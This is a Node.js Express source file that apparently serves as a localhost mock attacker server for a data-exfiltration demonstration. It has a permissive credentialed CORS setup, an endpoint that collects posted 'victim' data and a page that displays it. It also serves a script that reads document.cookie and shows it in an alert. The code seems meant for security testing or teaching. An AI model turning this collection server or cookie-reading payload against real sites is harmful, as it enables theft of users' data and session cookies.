const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const ip = "localhost";
const port = 8080;

const storedData = [];

// Middleware for parsing JSON
app.use(express.json());

// ORS setup is more informative
app.use(
    cors({
        origin: "*",
        methods: ["GET", "POST", "OPTIONS"],
        allowedHeaders: ["Content-Type", "X-CSRF-TOKEN"],
        credentials: true
    })
);

// log all incoming requests
app.use((req, res, next) => {
    console.log(
        `[${new Date().toISOString()}] ${req.method} ${req.originalUrl}`
    );
    next();
});

// endpoint for receiving data
app.post("/invitations/send", (req, res) => {
    const data = req.body;

    storedData.push(data);
    res.status(200).json({
        status: "success",
        received: data,
        info: "Data exfiltration simulation successful!"
    });
});

// display victim data
app.get("/victim-data", (req, res) => {
    res.send(`
        <h1>VICTIM DATA</h1>
        <pre>${JSON.stringify(storedData, null, 2)}</pre>
    `);
});

// success redirect
app.get("/:other", (req, res) => {
    res.send(`
        <h1>Success Redirect To Attacker Site</h1>
    `);
});

app.get('/apps/portal/security.js', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    const clientSideJavaScriptCode = `
        var cookies = document.cookie;
        alert("Cookies: " + cookies);
    `;

    res.send(clientSideJavaScriptCode);
});

// Homepage
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Run server
app.listen(port, ip, () => {
    console.log(`Server listening on http://${ip}:${port}`);
});
